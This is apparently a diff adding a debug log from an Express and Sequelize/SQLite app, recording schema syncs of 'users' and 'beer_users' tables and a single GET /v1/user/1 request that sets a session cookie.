+2025-12-18T12:41:25.579Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.593Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.594Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.609Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.609Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.624Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.624Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.637Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.638Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.650Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.651Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.664Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.664Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.664Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.665Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.666Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.666Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.666Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.667Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.682Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.682Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.698Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.698Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.716Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.716Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.740Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.741Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.755Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.756Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.774Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.774Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.775Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.775Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.778Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.779Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.779Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.779Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.795Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.795Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.807Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.807Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.822Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.822Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.835Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.835Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.850Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.851Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.867Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.867Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.868Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.868Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.868Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.869Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.869Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.870Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.884Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.885Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.899Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.900Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.914Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.915Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.929Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.930Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.942Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.943Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.954Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.954Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.955Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.955Z sequelize:sql:sqlite Executing (default): SELECT name FROM sqlite_master WHERE type='table' AND name='beer_users';
+2025-12-18T12:41:25.955Z sequelize:sql:sqlite Executed (default): SELECT name FROM sqlite_master WHERE type='table' AND name='beer_users';
+2025-12-18T12:41:25.955Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beer_users`);
+2025-12-18T12:41:25.956Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:25.956Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beer_users`);
+2025-12-18T12:41:25.956Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:25.956Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:25.956Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:25.957Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:25.957Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:25.957Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:25.957Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:25.957Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:25.957Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:25.958Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:25.958Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:25.958Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beer_users`);
+2025-12-18T12:41:25.958Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beer_users`);
+2025-12-18T12:41:25.958Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:25.959Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:25.960Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:25.960Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:25.960Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beer_users_backup` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:25.974Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beer_users_backup` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:25.975Z sequelize:sql:sqlite Executing (default): INSERT INTO `beer_users_backup` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users`;
+2025-12-18T12:41:25.975Z sequelize:sql:sqlite Executed (default): INSERT INTO `beer_users_backup` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users`;
+2025-12-18T12:41:25.975Z sequelize:sql:sqlite Executing (default): DROP TABLE `beer_users`;
+2025-12-18T12:41:25.989Z sequelize:sql:sqlite Executed (default): DROP TABLE `beer_users`;
+2025-12-18T12:41:25.990Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beer_users` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:26.003Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beer_users` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:26.003Z sequelize:sql:sqlite Executing (default): INSERT INTO `beer_users` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users_backup`;
+2025-12-18T12:41:26.003Z sequelize:sql:sqlite Executed (default): INSERT INTO `beer_users` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users_backup`;
+2025-12-18T12:41:26.003Z sequelize:sql:sqlite Executing (default): DROP TABLE `beer_users_backup`;
+2025-12-18T12:41:26.018Z sequelize:sql:sqlite Executed (default): DROP TABLE `beer_users_backup`;
+2025-12-18T12:41:26.018Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beer_users`);
+2025-12-18T12:41:26.019Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beer_users`);
+2025-12-18T12:41:26.019Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:26.019Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:26.019Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:26.019Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:26.020Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:26.020Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:26.020Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:26.020Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:26.021Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:26.021Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beer_users`)
+2025-12-18T12:41:26.022Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beer_users_backup` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:26.040Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beer_users_backup` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:26.041Z sequelize:sql:sqlite Executing (default): INSERT INTO `beer_users_backup` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users`;
+2025-12-18T12:41:26.042Z sequelize:sql:sqlite Executed (default): INSERT INTO `beer_users_backup` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users`;
+2025-12-18T12:41:26.042Z sequelize:sql:sqlite Executing (default): DROP TABLE `beer_users`;
+2025-12-18T12:41:26.054Z sequelize:sql:sqlite Executed (default): DROP TABLE `beer_users`;
+2025-12-18T12:41:26.054Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beer_users` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:26.069Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beer_users` (`created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER NOT NULL UNIQUE REFERENCES `users` (`id`), `beer_id` INTEGER NOT NULL UNIQUE REFERENCES `beers` (`id`), PRIMARY KEY (`user_id`, `beer_id`));
+2025-12-18T12:41:26.070Z sequelize:sql:sqlite Executing (default): INSERT INTO `beer_users` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users_backup`;
+2025-12-18T12:41:26.071Z sequelize:sql:sqlite Executed (default): INSERT INTO `beer_users` SELECT `created_at`, `updated_at`, `user_id`, `beer_id` FROM `beer_users_backup`;
+2025-12-18T12:41:26.071Z sequelize:sql:sqlite Executing (default): DROP TABLE `beer_users_backup`;
+2025-12-18T12:41:26.089Z sequelize:sql:sqlite Executed (default): DROP TABLE `beer_users_backup`;
+2025-12-18T12:41:26.090Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:26.091Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beer_users`)
+2025-12-18T12:41:26.091Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:26.091Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:26.091Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+2025-12-18T12:41:26.092Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_1`)
+2025-12-18T12:41:26.093Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_2`)
+2025-12-18T12:41:26.093Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_INFO(`sqlite_autoindex_beer_users_3`)
+Thu, 18 Dec 2025 12:41:36 GMT express:router dispatching GET /v1/user/1
+Thu, 18 Dec 2025 12:41:36 GMT express:router query  : /v1/user/1
+Thu, 18 Dec 2025 12:41:36 GMT express:router expressInit  : /v1/user/1
+Thu, 18 Dec 2025 12:41:36 GMT express:router jsonParser  : /v1/user/1
+Thu, 18 Dec 2025 12:41:36 GMT body-parser:json skip empty body
+Thu, 18 Dec 2025 12:41:36 GMT express:router session  : /v1/user/1
+Thu, 18 Dec 2025 12:41:36 GMT express-session no SID sent, generating session
+Thu, 18 Dec 2025 12:41:36 GMT express:router cookieParser  : /v1/user/1
+2025-12-18T12:41:36.934Z sequelize:sql:sqlite Executing (default): SELECT `user`.`id`, `user`.`email`, `user`.`profile_pic`, `user`.`password`, `user`.`role`, `user`.`address`, `user`.`name`, `user`.`created_at`, `user`.`updated_at`, `user`.`deleted_at`, `user`.`created_at` AS `createdAt`, `user`.`updated_at` AS `updatedAt`, `user`.`deleted_at` AS `deletedAt`, `beers`.`id` AS `beers.id`, `beers`.`name` AS `beers.name`, `beers`.`picture` AS `beers.picture`, `beers`.`price` AS `beers.price`, `beers`.`currency` AS `beers.currency`, `beers`.`stock` AS `beers.stock`, `beers`.`created_at` AS `beers.created_at`, `beers`.`updated_at` AS `beers.updated_at`, `beers`.`deleted_at` AS `beers.deleted_at`, `beers`.`created_at` AS `beers.createdAt`, `beers`.`updated_at` AS `beers.updatedAt`, `beers`.`deleted_at` AS `beers.deletedAt`, `beers->beer_users`.`created_at` AS `beers.beer_users.createdAt`, `beers->beer_users`.`updated_at` AS `beers.beer_users.updatedAt`, `beers->beer_users`.`user_id` AS `beers.beer_users.userId`, `beers->beer_users`.`beer_id` AS `beers.beer_users.beerId` FROM `users` AS `user` LEFT OUTER JOIN ( `beer_users` AS `beers->beer_users` INNER JOIN `beers` AS `beers` ON `beers`.`id` = `beers->beer_users`.`beer_id`) ON `user`.`id` = `beers->beer_users`.`user_id` AND (`beers`.`deleted_at` IS NULL) WHERE (`user`.`deleted_at` IS NULL AND `user`.`id` = '1');
+2025-12-18T12:41:36.937Z sequelize:sql:sqlite Executed (default): SELECT `user`.`id`, `user`.`email`, `user`.`profile_pic`, `user`.`password`, `user`.`role`, `user`.`address`, `user`.`name`, `user`.`created_at`, `user`.`updated_at`, `user`.`deleted_at`, `user`.`created_at` AS `createdAt`, `user`.`updated_at` AS `updatedAt`, `user`.`deleted_at` AS `deletedAt`, `beers`.`id` AS `beers.id`, `beers`.`name` AS `beers.name`, `beers`.`picture` AS `beers.picture`, `beers`.`price` AS `beers.price`, `beers`.`currency` AS `beers.currency`, `beers`.`stock` AS `beers.stock`, `beers`.`created_at` AS `beers.created_at`, `beers`.`updated_at` AS `beers.updated_at`, `beers`.`deleted_at` AS `beers.deleted_at`, `beers`.`created_at` AS `beers.createdAt`, `beers`.`updated_at` AS `beers.updatedAt`, `beers`.`deleted_at` AS `beers.deletedAt`, `beers->beer_users`.`created_at` AS `beers.beer_users.createdAt`, `beers->beer_users`.`updated_at` AS `beers.beer_users.updatedAt`, `beers->beer_users`.`user_id` AS `beers.beer_users.userId`, `beers->beer_users`.`beer_id` AS `beers.beer_users.beerId` FROM `users` AS `user` LEFT OUTER JOIN ( `beer_users` AS `beers->beer_users` INNER JOIN `beers` AS `beers` ON `beers`.`id` = `beers->beer_users`.`beer_id`) ON `user`.`id` = `beers->beer_users`.`user_id` AND (`beers`.`deleted_at` IS NULL) WHERE (`user`.`deleted_at` IS NULL AND `user`.`id` = '1');
+Thu, 18 Dec 2025 12:41:36 GMT express-session saving 1766061696926
+Thu, 18 Dec 2025 12:41:36 GMT express-session set-cookie sessionID=s%3A1766061696926.om1Kb2svah9syKrTWVCKY1HuaN4lhRq%2FqJ7tSAAiEQk; Path=/; Expires=Fri, 17 Apr 2026 12:41:36 GMT; SameSite=Lax
+Thu, 18 Dec 2025 12:41:36 GMT express-session split response
